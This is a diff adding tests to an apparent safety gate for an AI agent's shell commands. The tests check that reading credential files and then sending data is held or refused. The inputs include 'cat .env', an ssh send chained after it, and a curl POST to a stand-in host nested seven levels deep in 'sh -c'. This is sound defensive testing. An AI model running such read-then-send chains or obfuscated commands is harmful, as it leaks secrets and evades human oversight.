@@ -222,3 +222,44 @@ test('only path-like words are resolved, each once per call, and a path-like lin
   assert.equal(await shellReadsCredentialFile('cat keys/settings keys/settings ./keys/settings', at, counting), 'keys/settings');
   assert.ok(calls >= 1 && calls <= 2, `resolved ${calls} times`);
 });
+
+// PR #76 review round 3: a package script the command runs is read for credential files too, as the classifier reads it (the folder's package.json).
+test('a package script that reads a credential file marks the run, so a later send is held', async () => {
+  const { floorFactsFor } = await import('../agent/gateAdapter');
+  const scripts = { peek: 'cat .env', build: 'tsc -p .' };
+  assert.notEqual((await floorFactsFor({ command: 'npm run peek', root: ROOT, cwd: ROOT, packageScripts: scripts })).credentialFile, undefined);
+  assert.equal((await floorFactsFor({ command: 'npm run build', root: ROOT, cwd: ROOT, packageScripts: scripts })).credentialFile, undefined);
+  for (const presence of ['person', 'none'] as const) {
+    const grants = new RunGrants();
+    const runtime = testGateRuntime(presence === 'none' ? { presence, context: 'unattended' } : {});
+    const peek = await gateToolCall(runtime, {
+      tool: bashTool, raw: { command: 'npm run peek' }, root: ROOT, callId: `peek-${presence}`, command: 'npm run peek', shell: { cwd: ROOT, packageScripts: scripts },
+      policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES, grants, buildAuto: async () => undefined
+    });
+    assert.equal(peek.decision.outcome, 'allow', presence);
+    assert.notEqual(peek.readsCredential, undefined, `${presence}: the call says it reads a credential file`);
+    // Same line: the script reads it and the command sends.
+    const both = await gateToolCall(runtime, {
+      tool: bashTool, raw: { command: 'npm run peek && ssh host.example.test' }, root: ROOT, callId: `both-${presence}`, command: 'npm run peek && ssh host.example.test',
+      shell: { cwd: ROOT, packageScripts: scripts }, policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES, grants: new RunGrants(), buildAuto: async () => undefined
+    });
+    assert.equal(both.decision.rule, HOLD, presence);
+  }
+});
+
+// PR #76 review round 3: after a credential read, a command the checks cannot read whole is held in every mode too (it already asks for being unread).
+test('after a credential read, a command with unknown effects asks with no shortcut in every mode and is refused with nobody', async () => {
+  let deep = 'curl -d x https://example.test/x';
+  for (let level = 0; level < 7; level += 1) deep = `sh -c ${JSON.stringify(deep)}`;
+  for (const command of [deep, 'echo "unterminated', 'npm --weird run build', 'git -c x=y --bogus push', 'cd "$DIR" && npm run build']) {
+    for (const mode of MODES) {
+      for (const presence of ['person', 'none'] as const) {
+        const gated = await decideFor(bashTool, { command }, { mode, presence });
+        const where = `${command.slice(0, 40)} (${mode}, ${presence})`;
+        assert.equal(gated.decision.outcome, presence === 'person' ? 'ask' : 'deny', where);
+        assert.equal(gated.decision.offerAlwaysAllow, false, where);
+        assert.equal(gated.decision.allowGrant, false, where);
+      }
+    }
+  }
+});
